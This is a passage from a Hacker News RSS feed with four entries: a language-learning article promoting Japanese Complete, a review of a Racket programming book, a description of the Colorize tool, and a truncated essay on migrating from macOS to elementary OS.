            <guid isPermaLink="false">hacker-news-small-sites-25829337</guid>
            <pubDate>Tue, 19 Jan 2021 02:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study, Immersion, and Generation: The Keys to Language Learning]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25828687">thread link</a>) | @sova
<br/>
January 18, 2021 | https://japanesecomplete.com/articles/?p=1328 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/articles/?p=1328">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1328">

	

	
			<figure>
				<img width="1568" height="1045" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/fuji-tori.jpg" alt="Mt. Fuji as seen through a Torii" loading="lazy">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<h2><strong>Q: What’s the best way to get to a proficient level in a target language quickly?</strong></h2>



<p>A: Create a solid foundation through <strong>study</strong>, <strong>immerse</strong> yourself in native media, <strong>and</strong> <strong>practice</strong> <strong>generating</strong> your own speech and writing based on what you know.  Repeat the process and have joy while doing it.</p>



<div><figure><img loading="lazy" width="700" height="700" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/study-immersion-generation-triangle.png" alt=""><figcaption>Study, Immersion, Generation — three corners of a triangle for expedient attainment of proficiency in any target language.</figcaption></figure></div>



<p>At Japanese Complete we focus on creating solutions to target “Study” and “Generation,” while others in the world have been quite successful at creating solutions that target “Immersion.”</p>







<p>For example, our <a href="https://japanesecomplete.com/">innovative online textbook</a> has thorough grammar explanations not available elsewhere, and lessons to learn kanji by meaning-word and mnemonic, with a portion of the page dedicated to practicing your kanji drawing skill.  We also have quizzes for each chapter so you can be sure you are recalling the verbs, kanji, and grammatical particles you have learned in each lesson.</p>



<p><a href="https://japanesecomplete.com/articles/?p=1265">Because Japanese grammar is so different from English</a> and Romance languages, it is vital that one has a very solid foundation upon which to build their understanding.  If one were simply “dropped into Japan” one day out of the blue, it would be an uphill climb in learning the basic grammar through immersion, which is why stepping stones in the very beginning are excellent for speeding up one’s attainment of proficiency.</p>



<h3>Frequency Analysis</h3>



<p>There have been some extensive Frequency Analysis projects of the Japanese language, such as the BCCWJ (Balanced Corpus of Contemporary Written Japanese) that aim to provide educators with a way to teach the language in a sequence consistent with immediate usefulness, effectiveness, and proportional to occurence in the wild.  For example, the <a href="https://japanesecomplete.com/777">most frequent 777 kanji cover roughly 90% of all kanji seen in the wild</a>, while the next 700 (#778-1447) cover just 8%.  This is consistent with Zipf’s law, and Zipf’s insight can readily be brought to language learning by using a frequency-based dictionary or otherwise created frequency-list.</p>



<div><figure><img loading="lazy" width="600" height="300" src="https://japanesecomplete.com/articles/wp-content/uploads/2020/12/the-graph.png" alt=""><figcaption>Set yourself up for success with a solid foundation based on Frequency Analysis and Research-Based methods.</figcaption></figure></div>







<p>“Get your ears wet.” </p>



<p>Free services such as <a href="https://supernative.tv/">Super Native TV</a> allow learners to listen to small clips of real Japanese shows and videos, and even do small quizzes based on listening and filling in the blank — a portion of the original is deleted and one has to type in the correct missing words or letters.</p>



<figure><img loading="lazy" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-18-at-5.08.17-PM.png" alt="" width="780" height="597"><figcaption>SuperNative.TV has a great interface for listening to real Japanese media and practicing your listening and recall.</figcaption></figure>



<h2>Browser Extensions</h2>



<p>Other useful pieces for immersion without dunking yourself into the nation of Japan straight-away include browser extensions such as <a href="https://addons.mozilla.org/en-US/firefox/addon/rikaichamp/">RikaiChamp for Firefox</a> or <a href="https://chrome.google.com/webstore/detail/rikaikun/jipdnfibhldikgcjhfnomkfpcebammhp?hl=en">RikaiKun for Chrome</a> that function as dynamic tooltip dictionaries for browsing the web.  Now you can go to a Japanese news site and hover over text to get the definitions from the loaded dictionary files straight into a useful tooltip.</p>



<figure><img src="https://addons.cdn.mozilla.net/user-media/previews/full/228/228746.png?modified=1599530672" alt=""><figcaption>Provided Screenshots of RikaiChamp for Firefox.  Rikai means “understanding” or “comprehension.”</figcaption></figure>



<p>There are also new projects trying to create a stronger immersion-based environment for daily life on the screen — <a href="https://www.patreon.com/Migaku">Migaku</a> (jp: “to polish”) is a (mostly?) open-source project that, when subscribed to their $5 tier on their Patreon, provides a browser extension that uses loaded dictionary files to define text with tooltips, and also allows one to create flash cards seamlessly within that experience.  There is also the ability to create flash cards from subtitles on Netflix and anything with .srt files so you can create flash cards for snippets from your favorite video and television programs. Although it might be rough around the edges, there are now 3 lads working on it full-time so hopefully it will just get better and better for language immersion in the browser.</p>



<figure><img loading="lazy" width="1303" height="699" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-18-at-5.28.18-PM.png" alt=""><figcaption>Migaku Browser Extension for creating flash cards while browsing, and for creating flash cards from videos you watch with subtitle files.</figcaption></figure>







<h2>Writing</h2>



<p>The last step of the loop for fluency is <strong>generation</strong>, which occurs when one uses their target language to speak or write.  At Japanese Complete we have created some very interesting tools to aide users in generating grammatical Japanese, such as our tool <a href="https://japanesecomplete.com/articles/?p=1099">Wag: the Visual Sentence Composer</a> that lets you build grammatically-correct sentences in Japanese via point-and-click.   </p>



<figure><img loading="lazy" width="845" height="639" src="https://japanesecomplete.com/articles/wp-content/uploads/2020/05/wag-maker-a1.gif" alt=""><figcaption>Visual sentence-composer for Japanese “Wag,” also provides rudimentary translations via tech indistinguishable from magic.</figcaption></figure>



<h2>Speaking</h2>



<p>For generating speaking ability, <a href="https://supernative.tv/">supernative.tv</a> has a listen-and-repeat mode.  There are also several services for connecting with language experts and practicing your conversation skills available as apps for mobile devices.  There is also the opportunity to connect with language tutors via video chat and practice one’s speaking abilities this way.</p>



<h2>Closing Remarks</h2>



<p>Create a <strong>solid foundation</strong> through exemplary materials so you waste no time.  This is studying well.</p>



<p><strong>Immerse yourself</strong> in native media as much as possible: news, shows, film, youtube, articles, books, songs, and in the case of Japanese: manga, anime, etc.</p>



<p>Practice <strong>generating language</strong> both verbal and written so you can quickly attain a flexible level of proficiency in your target language.</p>



<p>By finding excellent tools to satisfy each of the three circles of “Study, Immersion, and Generation,” (and using them on repeat) one can swiftly attain fluency in any language.</p>







<p>Start learning Japanese now for free with our guide <a href="https://japanesecomplete.com/guide">Essential Japanese: The Mental Model</a>.  For a more thorough path and course, check out <a href="https://japanesecomplete.com/">Japanese Complete</a>.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://japanesecomplete.com/articles/?p=1328</link>
            <guid isPermaLink="false">hacker-news-small-sites-25828687</guid>
            <pubDate>Tue, 19 Jan 2021 00:54:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Racket Programming the Fun Way]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25828636">thread link</a>) | @hydroxideOH-
<br/>
January 18, 2021 | https://micahcantor.xyz/blog/racket-programming-the-fun-way-review | <a href="https://web.archive.org/web/*/https://micahcantor.xyz/blog/racket-programming-the-fun-way-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p><span>
      <a href="https://micahcantor.xyz/static/c2519a2746ba269ce8b3c8bc01fb3340/d743b/racket-the-fun-way.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Racket Programming the Fun Way Cover" title="Racket Programming the Fun Way Cover" src="https://d33wubrfki0l68.cloudfront.net/16185ee4d0543aebdb8f35971e95a7b54d894ffa/030df/static/c2519a2746ba269ce8b3c8bc01fb3340/d743b/racket-the-fun-way.png" srcset="https://d33wubrfki0l68.cloudfront.net/f7228ff507b2d17447f283b8bbd5550fee793544/f86e2/static/c2519a2746ba269ce8b3c8bc01fb3340/222b7/racket-the-fun-way.png 163w,
https://d33wubrfki0l68.cloudfront.net/9b02fd455d49b9dba73a1cae7fb68c6539ca2862/ae893/static/c2519a2746ba269ce8b3c8bc01fb3340/ff46a/racket-the-fun-way.png 325w,
https://d33wubrfki0l68.cloudfront.net/16185ee4d0543aebdb8f35971e95a7b54d894ffa/030df/static/c2519a2746ba269ce8b3c8bc01fb3340/d743b/racket-the-fun-way.png 477w" sizes="(max-width: 477px) 100vw, 477px" loading="lazy">
  </a>
    </span></p>
<p>If you look around the web for reasons why you should learn Racket, or its ancestors Lisp and Scheme, you'll find no shortage of answers. On Racket's official website, it is proudly named the <a href="https://racket-lang.org/"><em>language-oriented programming language</em></a>. For Matthew Butterick, author of <em><a href="https://beautifulracket.com/">Beautiful Racket</a></em>, it's Racket's <a href="https://beautifulracket.com/appendix/why-racket-why-lisp.html"><em>beauty</em> and <em>expressiveness</em></a> that draw him to it. And for others, like programmers Eric Raymond and Paul Graham, it is worth learning for its <a href="http://www.catb.org/esr/faqs/hacker-howto.html"><em>profound enlightenment</em>,</a> or because it can be used as a <a href="http://www.paulgraham.com/avg.html"><em>secret weapon</em>.</a></p>
<p>These are all compelling answers that reflect the truly wide variety of programmers that the Lisp family of languages attract. But none of these are why James Stelly has written his new book, <a href="https://nostarch.com/racket-programming-fun-way"><em>Racket Programming the Fun Way</em></a>. Instead, as its name suggests, Stelly thinks you should learn Racket because it is just plain <em>fun</em>.</p>
<p>There's good reason for Stelly's appraisal, as Racket's simple and consistent syntax makes it an ideal language for new programmers, as well as those who are tired of the all-too-similar C-like languages. Out of the box, Racket also includes <a href="https://docs.racket-lang.org/drracket/">DrRacket</a>, a graphical IDE, and boasts a large standard library for creating <a href="https://docs.racket-lang.org/gui/">GUIs</a>, <a href="https://docs.racket-lang.org/draw/index.html">drawings</a>, <a href="https://docs.racket-lang.org/games/index.html">games</a>, <a href="https://docs.racket-lang.org/plot/">math plots</a>, and much more.</p>
<p>At first glance, the book certainly seems to align with this sentiment. Stelly's writing is light and inviting, and the book's playful cover matches the little illustrations and diagrams scattered throughout the text. </p>
<p>After the introductory chapters, which cover the basics of s-expressions, linked lists, lambda functions, and core standard library functions, Stelly begins to build on the foundation he has laid. The next three chapters deal with Racket's graphical capabilities, covering math plots, GUIs, and data visualizations. In all of these, Stelly finds ways to keep the mathematically-inclined reader engaged by introducing some basic concepts in set theory, trigonometry, and statistics. For me, though, the most interesting parts of these chapters come in their respective "applications" sections, where Stelly tiles Fibonacci numbers and implements <a href="https://en.wikipedia.org/wiki/Nim">the game of Nim</a>, among other diversions.</p>
<p>The book's strongest chapters, however, and the ones that would persuade me to recommend the book to experienced yet curious programmers, come at the end. In these, Stelly addresses graph theory, logic programming, pushdown automata and Turing machines, and finally, lexing and parsing. Importantly, many of these concepts are addressed in a purpose-driven way that is designed to solve problems: implementing depth first search helps Stelly solve Sudoku, while the parsing chapter is centered around building a functional algebraic calculator.</p>
<p>While the more advanced computer science topics addressed in these chapters can seem intimidating, Stelly covers them in a way that does them justice while still being approachable to those without a formal CS education. Even though these topics may not be covered with the same rigor as a <a href="https://en.wikipedia.org/wiki/Introduction_to_Algorithms">CLRS</a> or <a href="https://mitpress.mit.edu/sites/default/files/sicp/full-text/book/book.html">SICP</a>, I think the clear diagrams and readable Racket code presented in these sections serve as a great way for those who want to learn more to gain valuable intuition before studying the concepts more in depth.</p>
<p>My only complaint is that I wish Stelly had included more exercises at the end of these chapters, since they are deep topics that warrant more exploring by the reader. It is also disappointing that Stelly did not find any space to include a treatment of Racket <a href="https://docs.racket-lang.org/guide/macros.html">macros</a>, since they are one of the most unique and powerful features of the language.</p>
<p>Still, <em>Racket Programming the Fun Way</em> is a decidedly fun and informative read that I would recommend both to novice Racket programmers and those who are looking to take a bit of a deeper dive into the language. Stelly's book joins good company alongside <em>Beautiful Racket</em> and <a href="https://htdp.org/"><em>How To Design Programs</em></a> as excellent books on Racket, which can hopefully bring the language to a wider audience in the programming community.</p>
<h3>Acknowledgements</h3>
<p>I received a physical review copy from No Starch Press, but was not otherwise compensated for this review.</p></div></div></div>]]>
            </description>
            <link>https://micahcantor.xyz/blog/racket-programming-the-fun-way-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-25828636</guid>
            <pubDate>Tue, 19 Jan 2021 00:47:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Colorize]]>
            </title>
            <description>
<![CDATA[
Score 154 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25828312">thread link</a>) | @didizaja
<br/>
January 18, 2021 | https://alexbeals.com/projects/colorize/ | <a href="https://web.archive.org/web/*/https://alexbeals.com/projects/colorize/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<h2>What is Colorize?</h2>
			<p>Colorize is a website that turns any word or phrase into a hex color.  It works by using a search engine to find image results for the word or phrase, and then finding the average color across the approximately 25 image results.  Because of this, there's usually a small delay when a word is searched for the first time.</p>

			<h2>What would I use it for?</h2>
			<p>If you've ever been drawing in Photoshop and thought 'What color is the sky', or have been designing a website and looking for that perfect 'purple' color, or just wanted to know what color sand is, Colorize is the tool for you.</p>

			
		</div></div>]]>
            </description>
            <link>https://alexbeals.com/projects/colorize/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25828312</guid>
            <pubDate>Tue, 19 Jan 2021 00:04:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating from Apple]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25828277">thread link</a>) | @uniqueid
<br/>
January 18, 2021 | https://orta.io/on/migrating/from/apple | <a href="https://web.archive.org/web/*/https://orta.io/on/migrating/from/apple">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div><p>During university in 2005, I was introduced to the mac as a viable option for someone interested in programming as a
career. Somone pitched it to me as a beautiful and well thought-out OS, with UNIX under the hood.</p>

<p>At the time, I was using Linux for school work, and Windows for games. I persuaded my parents that I could get
university work done on an <a href="https://en.wikipedia.org/wiki/IBook">iBook G4</a> and over time became enamoured by the idea of
being a Mac indie developer.</p>

<p>2006 saw the start of the <a href="https://weblog.rogueamoeba.com/2006/11/06/">Delicious Generation</a> - a resurgence of new
developers pushing the design aesthetics of the Mac, and exploring different ways of
<a href="https://en.wikipedia.org/wiki/MacHeist">engaging the Mac users community</a>. Whilst I wasn’t quite focused enough to be
able to contribute apps, that time period left a mark on me. In 2007, I got a
<a href="https://twitter.com/orta/status/36295382?s=20">student scholarship for WWDC</a> and managed to at least get a sense that
being a Mac indie was something I could potentially have my career as. It took until 2011 before I started working on
indie Mac apps, and that didn’t last too long due to VISA issues.</p>

<p>I didn’t really put my energy into being a Mac indie developer either full-time nor in my spare time. Once I became
confident enough in my programming skills to do serious work on the Mac, the open source community tools community was
really where my heart lay. I discovered I was a tool builder, not strictly a product one.</p>

<p>I never got a job with a focus on the Mac again.</p>

<p>It’s somewhat nebulous, but during the announcements of Apple’s new macOS 11 this year, I felt like a line had been
crossed in my mind: The Mac isn’t really the right OS for me anymore.</p>

<p>I’m not bitter, things have just changed since I first made the decision to move to the Mac. My priorities have changed,
and so have Apple’s. That’s OK.</p>

<h3 id="the-mac-is-for-ios-users">The Mac is for iOS Users</h3>

<p>I think it’s great that people who use iOS can re-use their apps now and access them as first-class citizens. I think
it’s great for them that the user interface of the Mac has been re-designed to be more in line with iOS. People with
iPhones are the majority here, and the Mac is a getting closer to being a rounding error in Apple’s financial reports
(today the Mac is 8% of all Apple profit, and a generally shrinking %.)</p>

<p><a href="https://forums.macrumors.com/threads/apple-reports-3q-2020-results-11-25b-profit-on-59-7b-revenue-4-for-1-stock-split-announced.2248022/"><img src="https://images.macrumors.com/t/N7MLkfnlwvkle7Xs2CSzK7f2Myc=/1600x0/filters:quality(90)/article-new/2020/01/1q20_earnings_line_labels.jpg" alt="https://images.macrumors.com/t/N7MLkfnlwvkle7Xs2CSzK7f2Myc=/1600x0/filters:quality(90)/article-new/2020/01/1q20_earnings_line_labels.jpg"></a></p>

<p>The Mac reaps benefits of all sorts from the halo effect of iOS’s stunning growth (more engineers, more eyes on the
platform, shared tooling). It’s also the only platform for making iOS apps, and Apple cares about it.</p>

<p>The bit that’s tricky for me is that I don’t use a phone, and I want my computer to be more like a truck than a car.</p>

<p>I don’t find a phone to be a useful device for me. When I’m not at a computer I don’t want to be instantly available to
others, nor do I use a phone as a media consuming device. It’s hard enough to find a life balance with my code
contributions without another place to get pings from.</p>

<p>That means that roughly the last 5 years of Mac changes have passed me by. Desktop OSes are mature, and so Apple has
prioritised a lot of porting iOS features, APIs and building syncing systems between them. Again, lots of cool stuff for
most folks, but not pushing the Mac, it’s pushing the consumer device ecosystem.</p>

<h3 id="progressively-more-restricted-computing">Progressively more restricted computing</h3>

<p>It’s unlikely Apple will ever truly force an App Store only system on the Mac. However, that doesn’t mean that the
incentives aren’t there for apple both financially (because Apple gets a 15-30% cut of all transactions) or from a
security perspective (Mac apps have a stricter sandbox and can be trusted more by users.)</p>

<p>Inside Apple, I bet keeping the Mac a good general purpose computer is a constant uphill battle.
<a href="https://sigpipe.macromates.com/2020/macos-catalina-slow-by-design/">The</a>
<a href="https://medium.com/rocknnull/xcode-8-plugins-alcatraz-the-end-of-an-era-ea6e63617d14">screws</a>
<a href="https://www.zdnet.com/article/apple-deprecating-macos-kernel-extensions-kexts-is-a-great-win-for-security/">keep</a> on
<a href="https://lapcatsoftware.com/articles/unsigned.html">tightening</a> .</p>

<p>I must stress, for nearly every Mac user these are good things. They don’t want a fully general purpose computer. For
most folks a web browser, a useful file-system and their own edge-case purpose apps provide all they need.</p>

<p>The move towards a more app-store focused, sandboxed OS means that whole genres of apps aren’t possible anymore. I’m
particularly sad about what happened to Safari extensions over the
<a href="https://sixcolors.com/post/2021/01/safari-14-added-webextensions-support-so-where-are-the-extensions/">last few years</a>.
I don’t want to put my time into a platform where the people starting today work in an increasingly smaller domain.</p>

<h3 id="native-is-less-valuable">Native is less valuable</h3>

<p>The last decade of focus on mobile by everyone has drastically reduced the value of writing a native app for a single
platform. The Mac has kinda been hit the hardest by this in my opinion. Mac software used to be about HIG conformance,
consistent design and interaction models - all of which tended to come at a pretty expensive price.</p>

<p>The Mac software ecosystem was like a street of local shops run by people in the community, and then post-iPhone all the
big shops moved in because they just wanted to make sure they were represented in the area. Modern desktop environments
now feel quite same-y, but this also trivialized OS switching costs.</p>

<p>The rise of Electron being the most <em>accessible</em> developer environment for desktop OSes has meant that all sorts of apps
are available on all platforms. They’re performant enough, and far more importantly <em>they actually exist</em>. You have to
have a lot of resources to ship a Website, Windows App, Mac App, iOS App and Android app just to somewhat be where your
users are.</p>

<p>Unless your company builds an app for just one platform, it’s just not worth the engineering investment to make
something work amazingly for each platform. In part that’s the initial cost, but the maintenance is also a long term
pain because OSes do re-designs or change the underlying tech. At Artsy we used to think it’d be roughly 1 month per
year in just keeping up with iOS updates, imagine that but also per platform and you’re struggling to even stand still.</p>

<p>Using something like Electron, and to some extent React Native, and you get to skip a lot of the OS update rat-race and
just work on a stable platform that runs across many OSes. Any engineer can create a feature that works across all
platforms. On top of that you get to use the world’s most popular programming language (JS) and UI toolset (HTML/CSS) to
make your apps.</p>

<p>These incentives means a lot of the apps I use today are all cross-platform Electron apps: VS Code,
Slack/Discord/Matrix, Spotify, Keybase/Signal</p>

<p>As the Mac software market gets harder to make money in, a few of the native apps I used have also moved to be
subscription services. This is in large part due to the app store de-valuing software (can’t pay for software updates,
you realistically have to keep providing updates for OS changes, trial system barely exists, people have lower
price-point expectations due to iOS’ scale) but sometimes due to these apps wanting to build and provide syncing systems
to account for mobile devices.</p>

<p>I’m all for paying money for applications, I especially like “pay for x months of updates” but generally subscriptions
are a trap to me. Which has meant independently of switching platforms, I’ve moved off more native software over the
last few years.</p>

<p>I do think there’s still a space for optimized native single platform software on the desktop (Sketch, Paw, Pixen, Nova
and Screenflow being great examples) but they are progressively becoming more and more niche.</p>

<p>Apple knows this, and the Mac has slowly become a better platform for time-cheap iOS ports in the last 2 releases.</p>

<h3 id="summary">Summary</h3>

<p>The point is not that the Mac is terrible, or that the ecosystem is dying etc. I don’t think that. It’s that the bits of
the Mac that kept me tied to it (building native apps for a living, a cohesive well designed UI, specific applications
which I use daily) don’t have the same pull as they once did. These used to be great trade-offs against the
closed-source nature of the OS/apps, and Apple’s occasional devrel hiccups.</p>

<p>So 2020 became the start of looking for alternatives. The result being <a href="https://elementary.io/">elementary OS</a> which
seems to be ticking all of the things I want. It’s well designed by a small team, they seem to be focused on providing a
cohesive OS by building all of the main apps for the OS and has the added bonus of being easy to contribute to. I’d love
to be able to put some time into fixing some of my papercuts with the OS.</p>

<p><img src="https://elementary.io/images/screenshots/desktop.jpg"></p>

<h3 id="its-elementary">It’s elementary</h3>

<p>In a way, elementary OS is like using an older build of macOS
(<a href="https://blog.elementary.io/introducing-elementary-os-5-1-hera/">elementary OS 5</a> feels a lot like macOS Snow Leopard,
with <a href="https://blog.elementary.io/updates-for-july-2020/">6’s feature-set</a> echoing macOS Lion). This might sound like a
insult to elementary, but honestly I can’t remember what’s new in the Mac anymore because I don’t really use the new
features.</p>

<p>There’s quite a lot of modern features you may be used to that aren’t on elementary OS, but the features that make you
productive as an engineer are. There’s a great terminal, web browser, file manager and your key IDE apps are likely
cross-platform by this point. Keyboard shortcuts work solidly. Almost all of my hardware worked out of the box.</p>

<p>I’ve not done a hard switch, probably never will, my laptop still runs macOS and I have a Mac Pro still around - there’s
no need to junk them, but I’m competent in using Linux as my daily driver.</p>

<p>I think moving to an OS which I can contribute to, and especially elementary OS which is <em>mainly</em> contributed to by a
few individuals using the same toolchain, is something I can do now. I’m really interested in diving more into the OS,
all of the apps seem to be built in a straightforward way and I’ve found a way to write native GTK applications with
TypeScript to scratch my own itches. Hopefully the write-up next year will include a discussion on how that’s gone.</p>

<h3 id="migration-pattern">Migration Pattern</h3>

<p>Roughly my route to switching first was about making long-term changes to my Mac usage:</p>

<ul>
  <li>
    <p>Move to electron apps, or cross platform alternatives. For example I switched from 1Password to Enpass, Sketch to
Figma, Apple Music to Spotify, Apple TV to Netflix, Safari to Firefox etc.</p>
  </li>
  <li>
    <p>Switch to a non-Apple keyboard/mouse. The non-native feel of Apple products on other OSes will give you constant
uncanny valley. I use a Logitech “MX Keys” keyboard, and “MX Vertical” mouse and they’re great. If you’re bold you
could try …</p></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://orta.io/on/migrating/from/apple">https://orta.io/on/migrating/from/apple</a></em></p>]]>
            </description>
            <link>https://orta.io/on/migrating/from/apple</link>
            <guid isPermaLink="false">hacker-news-small-sites-25828277</guid>
            <pubDate>Tue, 19 Jan 2021 00:01:05 GMT</pubDate>
        </item>
    </channel>
</rss>
